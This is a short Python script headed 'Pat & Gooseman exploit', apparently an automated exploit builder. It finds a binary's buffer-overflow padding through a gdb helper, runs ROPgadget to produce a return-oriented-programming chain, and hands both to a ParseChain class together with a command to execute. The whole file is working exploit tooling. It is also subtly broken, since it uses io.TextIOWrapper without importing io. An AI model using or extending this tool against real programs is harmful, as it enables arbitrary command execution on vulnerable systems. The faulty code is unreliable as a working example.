import argparse
import subprocess
from io import StringIO
from ParseChain import *

import gdb


def main():
    parser = argparse.ArgumentParser(description='Pat & Gooseman exploit')
    parser.add_argument('binary', metavar='B', type=str, nargs='+',
                    help='binary')
    parser.add_argument('-c', help='command to execute')

    args = parser.parse_args()

    binary = args.binary[0]

    buffer = gdb.get_padding_gdb(binary)
    print("Found padding length of " + str(buffer))

    command_rg = ["python3", "./ROPgadget/ROPgadget.py", "--binary", args.binary[0], "--ropchain"]
    with subprocess.Popen(command_rg, stdout=subprocess.PIPE) as process:
        output_stream = io.TextIOWrapper(process.stdout, newline='\n', encoding='utf-8')
        
        pc = ParseChain()
        pc.start(output_stream, args.c.split(' ')[0], args.c.split(' ')[1:], buffer)

main()